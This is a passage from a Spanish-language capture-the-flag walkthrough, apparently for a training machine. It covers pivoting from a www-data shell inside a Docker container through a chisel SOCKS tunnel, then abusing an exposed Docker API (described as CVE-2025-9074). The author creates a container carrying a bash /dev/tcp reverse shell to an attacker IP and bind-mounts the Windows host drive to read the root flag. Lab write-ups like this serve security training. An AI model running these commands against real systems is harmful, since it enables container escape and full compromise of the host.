uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
No hay algo que nos ayude.

Para los siguientes pasos, te recomiendo moverte al directorio `/tmp` y crear tu propio directorio.

Veamos la IP de esta máquina:
```bash
www-data@821fbd6a43fa:/tmp/Brsk$ ip a 
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host proto kernel_lo 
       valid_lft forever preferred_lft forever
2: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 5e:da:0e:c7:8a:9c brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.18.0.3/16 brd 172.18.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```
Observa que podemos ver una interfaz que es de un contenedor de **Docker**.

Otro archivo que podemos ver para asegurarnos de que es un contenedor de **Docker** es el archivo `/etc/resolv.cong`:
```bash
www-data@821fbd6a43fa:/tmp/Brsk$ cat /etc/resolv.conf
# Generated by Docker Engine.
# This file can be edited; Docker Engine will not make further changes once it
# has been modified.

nameserver 127.0.0.11
options ndots:0

# Based on host file: '/etc/resolv.conf' (internal resolver)
# ExtServers: [host(192.168.65.7)]
# Overrides: []
# Option ndots from: internal
```
Muy bien, descubrimos una interfaz interna aparte de la interfaz de **Docker**.

Podemos ver qué puertos están abiertos en esta IP con el siguiente oneliner:
```bash
www-data@821fbd6a43fa:/tmp/Brsk$ for port in {1..65535}; do echo > /dev/tcp/192.168.65.7/$port && echo "Port: $port open"; done 2>/dev/null
Port: 53 open
Port: 2375 open
Port: 3128 open
Port: 5555 open
```
Bien, hay 4 puertos abiertos.

Para ver qué servicios se están ocupando en estos puertos, podemos utilizar **chisel** para aplicar **Port Forwarding** utilizando **SOCKS** para crear un túnel y exponer toda la red de la máquina.

Te dejo el link de la herramienta **chisel**:
* <a href="https://github.com/jpillora/chisel" target="_blank">Repositorio de jpillora: chisel</a>

Una vez que descargues **chisel** en tu máquina, lo puedes mandar a la máquina víctima usando un servidor de **Python3** en tu máquina y en la máquina víctima realizas una petición con **curl** y el resultado lo guardas con el nombre de **chisel**:
```bash
www-data@821fbd6a43fa:/tmp/Brsk$ curl http://Tu_IP/chisel > chisel
```

Entonces, inicia **chisel** en tu máquina como servidor **SOCKS**:
```bash
./chisel server -p 4444 --reverse --socks5
2025/12/14 22:57:23 server: Reverse tunnelling enabled
2025/12/14 22:57:23 server: Fingerprint fg0Niy...
2025/12/14 22:57:23 server: Listening on http://0.0.0.0:4444
2025/12/14 22:57:35 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Conéctate al servidor indicando la creación de un túnel **SOCKS**:
```bash
www-data@821fbd6a43fa:/tmp/Brsk$ ./chisel client Tu_IP:4444 R:socks
2025/12/15 04:57:35 client: Connecting to ws://Tu_IP:4444
2025/12/15 04:57:37 client: Connected (Latency 374.347447ms)
```
Listo, ya podemos aplicar un escaneo con **nmap** a los puertos que vimos de la segunda IP.

Para realizar el escaneo, utiliza la herramienta **proxychains**:
```bash
proxychains nmap -sT -Pn -n -sV -p 53,2375,3128,5555 192.168.65.7
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-14 22:44 CST
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:53  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:3128  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:2375  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.65.7:5555  ...  OK
...
...
PORT     STATE SERVICE  VERSION
53/tcp   open  domain   (generic dns response: NOTIMP)
2375/tcp open  docker   Docker 28.3.2
3128/tcp open  http     nginx
5555/tcp open  freeciv?
```
El puerto más interesante es el **puerto 2375** que utiliza **Docker 28.3.2**.

Investigando este puerto con **ChatGPT**, vemos que se trata de un **Docker API** al que podemos tratar de ver con **curl**:
```bash
www-data@821fbd6a43fa:/tmp/Brsk$ curl -s http://192.168.65.7:2375
{"message":"page not found"}
```
Nos responde, por lo que tenemos acceso a este.

| **Docker API** |
|:--------------:|
| *Un Docker API es la interfaz de control remoto de Docker. Permite gestionar Docker programáticamente (crear contenedores, iniciar/parar servicios, ver imágenes, ejecutar comandos, etc.) mediante peticiones HTTP/REST.* |

Podemos ver información del **Docker API** si apuntamos al endpoint **version**, que si nos responde, también es un indicativo de que no esta bien configurado:
```bash
www-data@821fbd6a43fa:/tmp/Brsk$ curl http://192.168.65.7:2375/version
{"Platform":{"Name":"Docker Engine - Community"},"Components":[{"Name":"Engine","Version":"28.3.2","Details":{"ApiVersion":"1.51","Arch":"amd64","BuildTime":"2025-07-09T16:13:55.000000000+00:00","Experimental":"false","GitCommit":"e77ff99","GoVersion":"go1.24.5","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","MinAPIVersion":"1.24","Os":"linux"}},{"Name":"containerd","Version":"1.7.27","Details":{"GitCommit":"05044ec0a9a75232cad458027ca83437aae3f4da"}},{"Name":"runc","Version":"1.2.5","Details":{"GitCommit":"v1.2.5-0-g59923ef"}},{"Name":"docker-init","Version":"0.19.0","Details":{"GitCommit":"de40ad0"}}],"Version":"28.3.2","ApiVersion":"1.51","MinAPIVersion":"1.24","GitCommit":"e77ff99","GoVersion":"go1.24.5","Os":"linux","Arch":"amd64","KernelVersion":"6.6.87.2-microsoft-standard-WSL2","BuildTime":"2025-07-09T16:13:55.000000000+00:00"}
```
Nos respondió.

El simple hecho de que nos responda ya dice que está mal configurado porque no debería hacerlo.

Investigando un poco y con la ayuda de **ChatGPT**, vemos que es posible que sea vulnerable al **CVE-2025-9074**.

Aquí te dejo un blog que explica cómo aplicar esta vulnerabilidad:
* <a href="https://blog.qwertysecurity.com/Articles/blog3.html" target="_blank">When a SSRF is enough: Full Docker Escape on Windows Docker Desktop (CVE-2025-9074)</a>

En resumen, podemos aplicar un **SSRF** con el que podemos ejecutar comandos.

De acuerdo al blog, podemos crear una montura completa del directorio `/root`, lo que nos permite escalar privilegios dentro de este contenedor.

Ahí mismo, vienen los pasos para aplicar esta vulnerabilidad.

El problema es que se necesita una imagen para crear la montura, por lo que podemos revisar si existe alguna dentro de este mismo contenedor:
```bash
www-data@821fbd6a43fa:~/html$ curl http://192.168.65.7:2375/images/json
[{"Containers":1,"Created":1762794130,"Id":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","Labels":{"com.docker.compose.project":"docker_setup","com.docker.compose.service":"nginx-php","com.docker.compose.version":"2.39.1"},
"ParentId":"","Descriptor":{"mediaType":"application/vnd.oci.image.index.v1+json","digest":"sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666","size":856},
"RepoDigests":["docker_setup-nginx-php@sha256:93b5d01a98de324793eae1d5960bf536402613fd5289eb041bac2c9337bc7666"],"RepoTags":["docker_setup-nginx-php:latest"]...
```
Vemos que hay una imagen llamada **docker_setup-nginx-php**, siendo la que usaremos para crear nuestra montura.

Primero, creamos un **archivo JSON** que contiene las instrucciones para crear una montura del directorio `/root` y vamos a agregar la ejecución de una **Reverse Shell**:
```bash
cat create_container.json
{ "Image": "docker_setup-nginx-php:latest", "Cmd": ["/bin/bash","-c","bash -i >& /dev/tcp/Tu_IP/1337 0>&1"], "HostConfig": { "Binds": ["/mnt/host/c:/host_root"] } }
```

Descargamos este archivo en la máquina víctima:
```bash
www-data@821fbd6a43fa:/tmp/Brsk$ curl http://Tu_IP/create_container.json -o create_container.json
```

Ahora, ejecutamos nuestro **archivo JSON** utilizando el **Docker API** para que se cree el contenedor y este mismo tiene cargada la **Reverse Shell**; la respuesta la guardamos en otro archivo:
```bash
www-data@821fbd6a43fa:/tmp/Brsk$ curl -H "Content-Type: application/json" -d @create_container.json http://192.168.65.7:2375/containers/create -o resp.json
```

La ejecución fue exitosa, por lo que nos da un ID que podemos ver en el archivo de respuesta:
```bash
www-data@821fbd6a43fa:/tmp/Brsk$ cat resp.json 
{"Id":"3df7054...","Warnings":[]}
```

Levanta un listener con **netcat**:
```bash
nc -nlvp 1337
listening on [any] 1337 ...
```

Carga en una variable el **ID** que obtuvimos e iniciamos el contenedor utilizando ese **ID**:
```bash
www-data@821fbd6a43fa:/tmp/Brsk$ cid=3df7054...
www-data@821fbd6a43fa:/tmp/Brsk$ curl -X POST http://192.168.65.7:2375/containers/$cid/start
```

Observa la **netcat**:
```bash
nc -nlvp 1337
listening on [any] 1337 ...
connect to [Tu_IP] from (UNKNOWN) [10.10.11.98] 50136
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3df7054cf3c9:/var/www/html# whoami
whoami
root
```
Estamos dentro y somos **Root**.

Si revisamos el directorio `/host_root`, que es el directorio `/root` de la máquina víctima, vemos que ahí están los archivos de una máquina **Windows**:
```bash
root@3df7054cf3c9:/# cd host_root
cd host_root
root@3df7054cf3c9:/host_root# ls
ls
$RECYCLE.BIN
$WinREAgent
Documents and Settings
DumpStack.log.tmp
PerfLogs
Program Files
Program Files (x86)
ProgramData
Recovery
System Volume Information
Users
Windows
Windows.old
inetpub
pagefile.sys
```

Por último, obtengamos la última flag:
```bash
root@3df7054cf3c9:/host_root# cd Users/Administrator/Desktop
cd Users/Administrator/Desktop
root@3df7054cf3c9:/host_root/Users/Administrator/Desktop# ls
ls
desktop.ini
root.txt
root@3df7054cf3c9:/host_root/Users/Administrator/Desktop# cat root.txt
cat root.txt
...
```
Y con esto, terminamos la máquina.
